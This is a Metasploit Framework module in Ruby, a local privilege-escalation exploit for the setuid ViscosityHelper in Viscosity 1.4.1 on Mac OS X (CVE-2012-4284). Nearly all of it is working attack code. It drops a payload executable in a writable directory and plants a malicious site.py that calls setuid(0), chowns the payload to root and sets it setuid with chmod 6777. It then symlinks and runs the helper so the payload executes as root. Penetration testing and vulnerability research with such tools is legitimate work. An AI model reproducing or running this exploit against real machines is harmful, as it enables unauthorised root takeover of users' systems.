##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/exploit/exe'

class Metasploit4 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::EXE
	include Msf::Post::File
	include Msf::Post::Common

	def initialize(info={})
		super( update_info( info, {
				'Name'           => 'Viscosity setuid-set ViscosityHelper Privilege Escalation',
				'Description'    => %q{
						This module exploits a vulnerability in Viscosity 1.4.1 on Mac OS X. The
					vulnerability exists in the setuid ViscosityHelper, where an insufficient
					validation of path names allows execution of arbitrary python code as root.
					This module has been tested successfully on Viscosity 1.4.1 over Mac OS X
					10.7.5.
				},
				'References'     =>
					[
						[ 'CVE', '2012-4284' ],
						[ 'OSVDB', '84709' ],
						[ 'EDB', '20485' ],
						[ 'URL', 'http://blog.zx2c4.com/791' ]
					],
				'License'        => MSF_LICENSE,
				'Author'         =>
					[
						'Jason A. Donenfeld', # Vulnerability discovery and original Exploit
						'juan vazquez'        # Metasploit module
					],
				'DisclosureDate' => 'Aug 12 2012',
				'Platform'       => 'osx',
				'Arch'           => [ ARCH_X86, ARCH_X64 ],
				'SessionTypes'   => [ 'shell' ],
				'Targets'        =>
					[
						[ 'Viscosity 1.4.1 / Mac OS X x86',    { 'Arch' => ARCH_X86 } ],
						[ 'Viscosity 1.4.1 / Mac OS X x64',    { 'Arch' => ARCH_X64 } ]
					],
				'DefaultOptions' => { "PrependSetresuid" => true, "WfsDelay" => 2 },
				'DefaultTarget' => 0
			}))
		register_options([
				# These are not OptPath becuase it's a *remote* path
				OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
				OptString.new("Viscosity",   [ true, "Path to setuid ViscosityHelper executable", "/Applications/Viscosity.app/Contents/Resources/ViscosityHelper" ])
			], self.class)
	end

	def check
		if not file?(datastore["Viscosity"])
			print_error "ViscosityHelper not found"
			return CheckCode::Safe
		end

		check = session.shell_command_token("find  #{datastore["Viscosity"]} -type f -user root -perm -4000")

		if check =~ /ViscosityHelper/
			return CheckCode::Vulnerable
		end

		return CheckCode::Safe
	end

	def clean
		file_rm(@link)
		file_rm(@python_file)
		file_rm("#{@python_file}c")
		file_rm(@exe_file)
	end

	def exploit

		exe_name = rand_text_alpha(8)
		@exe_file = "#{datastore["WritableDir"]}/#{exe_name}"
		print_status("Dropping executable #{@exe_file}")
		write_file(@exe_file, generate_payload_exe)

		evil_python =<<-EOF
import os
os.setuid(0)
os.setgid(0)
os.system("chown root #{@exe_file}")
os.system("chmod 6777 #{@exe_file}")
os.execl("#{@exe_file}", "#{exe_name}")
		EOF

		@python_file = "#{datastore["WritableDir"]}/site.py"
		print_status("Dropping python #{@python_file}...")
		write_file(@python_file, evil_python)

		print_status("Creating symlink...")
		link_name = rand_text_alpha(8)
		@link = "#{datastore["WritableDir"]}/#{link_name}"
		cmd_exec "ln -s -f -v #{datastore["Viscosity"]} #{@link}"

		print_status("Running...")
		begin
			cmd_exec "#{@link}"
		rescue
			print_error("Failed. Cleaning files #{@link}, #{@python_file}, #{@python_file}c and #{@exe_file}...")
			clean
			return
		end
		print_warning("Remember to clean files: #{@link}, #{@python_file}, #{@python_file}c and #{@exe_file}")
	end
end

